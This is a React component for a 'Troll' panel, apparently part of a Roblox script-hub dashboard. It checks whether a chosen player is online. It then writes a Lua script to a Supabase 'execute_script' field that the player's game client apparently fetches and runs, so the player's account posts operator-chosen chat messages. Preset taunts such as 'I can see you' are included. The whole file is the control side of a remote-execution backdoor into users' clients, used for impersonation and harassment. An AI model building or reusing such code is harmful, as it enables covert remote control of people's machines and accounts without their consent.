import { useState, useEffect } from 'react';
import { MessageCircle, Wifi, WifiOff, Loader2, Send, X } from 'lucide-react';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';

interface TrollPanelProps {
  userId: number;
  username: string;
  onClose: () => void;
}

export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
  const [online, setOnline]     = useState<boolean | null>(null);
  const [checking, setChecking] = useState(true);
  const [message, setMessage]   = useState('');
  const [sending, setSending]   = useState(false);
  const [sent, setSent]         = useState<string[]>([]);
  const [games, setGames]       = useState<string[]>([]);
  const [gameName, setGameName] = useState('');

  useEffect(() => {
    checkOnline();
    loadGames();
  }, [userId]);

  const checkOnline = async () => {
    setChecking(true);
    try {
      const res = await fetch('/api/roblox', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          path: '/v1/presence/users',
          method: 'POST',
          body: { userIds: [userId] },
          domain: 'https://presence.roblox.com',
        }),
      });
      if (res.ok) {
        const data = await res.json();
        const presence = data?.userPresences?.[0];
        setOnline((presence?.userPresenceType ?? 0) >= 2);
      } else {
        setOnline(null);
      }
    } catch {
      setOnline(null);
    }
    setChecking(false);
  };

  const loadGames = async () => {
    const { data } = await supabase.from('game_status').select('game_name').order('game_name');
    if (data) {
      const g = data.map((r: any) => r.game_name);
      setGames(g);
      if (g.length > 0) setGameName(g[0]);
    }
  };

  const sendMessage = async () => {
    if (!message.trim()) return;
    if (!gameName) return toast.error('Select a game');
    setSending(true);

    // Build a Lua script that sends a chat message as the user
    const script = `
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
if not LP or LP.Name ~= "${username}" then return end
local msg = ${JSON.stringify(message.trim())}
pcall(function()
  local TextChatService = game:GetService("TextChatService")
  if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    local channel = TextChatService:FindFirstChild("TextChannels")
    if channel then
      local rbl = channel:FindFirstChild("RBXGeneral")
      if rbl then rbl:SendAsync(msg) return end
    end
  end
end)
pcall(function()
  local chat = game:GetService("Chat")
  chat:Chat(LP.Character and LP.Character:FindFirstChild("Head") or LP, msg, Enum.ChatColor.Blue)
end)
`.trim();

    const { error } = await supabase
      .from('game_status')
      .update({ execute_script: script })
      .eq('game_name', gameName);

    if (error) {
      toast.error(error.message);
    } else {
      setSent(prev => [...prev, `[${gameName}] ${message.trim()}`]);
      setMessage('');
      toast.success(`Chat message sent to @${username} in ${gameName} 😈`);
    }
    setSending(false);
  };

  const presets = [
    '👀 I can see you',
    'nice executor lol',
    'vhxLUA says hi 😈',
    'bro really thought 💀',
    'hello from the dashboard 👋',
  ];

  const s = { backgroundColor: 'var(--color-surface2)', borderColor: 'var(--color-border)' };
  const st = { color: 'var(--color-text)' };
  const sm = { color: 'var(--color-muted)' };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4"
      style={{ backgroundColor: 'rgba(0,0,0,0.7)' }}>
      <div className="w-full max-w-sm rounded-2xl border shadow-2xl overflow-hidden"
        style={{ backgroundColor: 'var(--color-surface)', borderColor: 'var(--color-border)' }}>

        <div className="flex items-center justify-between px-5 py-4 border-b"
          style={{ borderColor: 'var(--color-border)' }}>
          <div className="flex items-center gap-2">
            <MessageCircle className="w-4 h-4 text-purple-400" />
            <p className="text-sm font-semibold" style={st}>Troll @{username}</p>
          </div>
          <button onClick={onClose} style={sm}><X className="w-4 h-4" /></button>
        </div>

        <div className="p-5 space-y-4">
          {/* Online status */}
          <div className="flex items-center gap-3 p-3 rounded-xl border" style={s}>
            {checking
              ? <Loader2 className="w-4 h-4 animate-spin text-blue-400" />
              : online === true
                ? <Wifi className="w-4 h-4 text-emerald-400" />
                : <WifiOff className="w-4 h-4 text-red-400" />
            }
            <div>
              <p className="text-xs font-semibold" style={st}>
                {checking ? 'Checking...' : online === true ? 'In-Game 🟢' : online === false ? 'Offline 🔴' : 'Unknown'}
              </p>
              <p className="text-[10px]" style={sm}>Roblox ID: {userId}</p>
            </div>
            <button onClick={checkOnline} className="ml-auto text-[10px] px-2 py-1 rounded-lg border hover:opacity-80"
              style={{ borderColor: 'var(--color-border)', ...sm }}>
              Refresh
            </button>
          </div>

          {/* Game selector */}
          <div className="space-y-1.5">
            <p className="text-[10px] font-medium" style={sm}>TARGET GAME</p>
            <select value={gameName} onChange={e => setGameName(e.target.value)}
              className="w-full text-xs px-3 py-2 rounded-xl border outline-none"
              style={{ ...s, border: '1px solid var(--color-border)', ...st }}>
              {games.map(g => <option key={g} value={g}>{g}</option>)}
            </select>
          </div>

          {/* Presets */}
          <div>
            <p className="text-[10px] font-medium mb-2" style={sm}>QUICK MESSAGES</p>
            <div className="flex flex-wrap gap-1.5">
              {presets.map(p => (
                <button key={p} onClick={() => setMessage(p)}
                  className="text-[10px] px-2.5 py-1 rounded-full border hover:opacity-80"
                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}>
                  {p}
                </button>
              ))}
            </div>
          </div>

          {/* Message input */}
          <div className="space-y-2">
            <p className="text-[10px] font-medium" style={sm}>MESSAGE</p>
            <textarea
              value={message}
              onChange={e => setMessage(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && !e.shiftKey && (e.preventDefault(), sendMessage())}
              placeholder="Type a message to send in their chat..."
              maxLength={200}
              rows={3}
              className="w-full text-xs px-3 py-2 rounded-xl border outline-none resize-none"
              style={{ ...s, border: '1px solid var(--color-border)', ...st }}
            />
            <button onClick={sendMessage} disabled={sending || !message.trim() || !gameName}
              className="w-full py-2 rounded-xl text-xs font-medium flex items-center justify-center gap-2 transition-all disabled:opacity-40"
              style={{ backgroundColor: 'rgba(168,85,247,0.15)', color: '#a855f7', border: '1px solid rgba(168,85,247,0.3)' }}>
              {sending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
              Send in Chat
            </button>
            <p className="text-[10px]" style={sm}>
              💡 If @{username} is already in-game, the message sends within 5 seconds. If offline, it fires on their next session.
            </p>
          </div>

          {/* Sent log */}
          {sent.length > 0 && (
            <div className="space-y-1">
              <p className="text-[10px] font-medium" style={sm}>SENT</p>
              {sent.map((m, i) => (
                <div key={i} className="text-[10px] px-2.5 py-1.5 rounded-lg"
                  style={{ backgroundColor: 'rgba(168,85,247,0.08)', ...st }}>{m}</div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
